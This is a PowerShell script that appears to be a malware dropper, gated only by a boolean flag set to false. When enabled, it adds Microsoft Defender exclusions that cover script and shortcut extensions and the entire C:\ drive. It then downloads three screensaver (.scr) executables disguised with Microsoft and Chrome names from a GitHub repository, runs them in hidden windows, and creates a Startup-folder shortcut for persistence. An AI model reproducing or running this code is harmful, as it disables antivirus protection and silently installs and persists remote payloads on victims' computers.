# Define a boolean variable to control code execution
$RunCode = $false  # Set to $true to run the code, $false to skip it

# Function to contain the main code
function Execute-MainCode {
    if ($RunCode -eq $true) {
        # Add exclusions to Microsoft Defender
        powershell -WindowStyle Hidden -Command {
            Add-MpPreference -ExclusionExtension ".src"
            Add-MpPreference -ExclusionExtension ".avi"
            Add-MpPreference -ExclusionExtension ".ps1"
            Add-MpPreference -ExclusionExtension ".lnk"
            Add-MpPreference -ExclusionPath "C:\"
        }
        Start-Sleep -Seconds 2

        # Download and execute .scr files
        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command {
            Invoke-WebRequest -Uri "https://github.com/AXON47/scr/raw/refs/heads/main/microsoft-defender.scr" -OutFile "C:\Users\Public\microsoft-defender.scr"
            Start-Process -FilePath "C:\Users\Public\microsoft-defender.scr" -WindowStyle Hidden

            Invoke-WebRequest -Uri "https://github.com/AXON47/scr/raw/refs/heads/main/chrome.scr" -OutFile "C:\Users\Public\chrome.scr"
            Start-Process -FilePath "C:\Users\Public\chrome.scr" -WindowStyle Hidden

            Invoke-WebRequest -Uri "https://github.com/AXON47/scr/raw/refs/heads/main/microsoft.scr" -OutFile "C:\Users\Public\microsoft.scr"
            Start-Process -FilePath "C:\Users\Public\microsoft.scr" -WindowStyle Hidden
        }

        # Create a shortcut in the Startup folder
        $WshShell = New-Object -ComObject WScript.Shell
        $StartupFolder = [Environment]::GetFolderPath("Startup")
        $Shortcut = $WshShell.CreateShortcut("$StartupFolder\microsoft.lnk")
        $Shortcut.TargetPath = "C:\Users\Public\microsoft.scr"
        $Shortcut.WorkingDirectory = "C:\Users\Public"
        $Shortcut.WindowStyle = 7
        $Shortcut.Description = "Microsoft SCR"
        $Shortcut.Save()
    }
    else {
        Write-Output "Code execution skipped because RunCode is set to false."
    }
}

# Call the function
Execute-MainCode
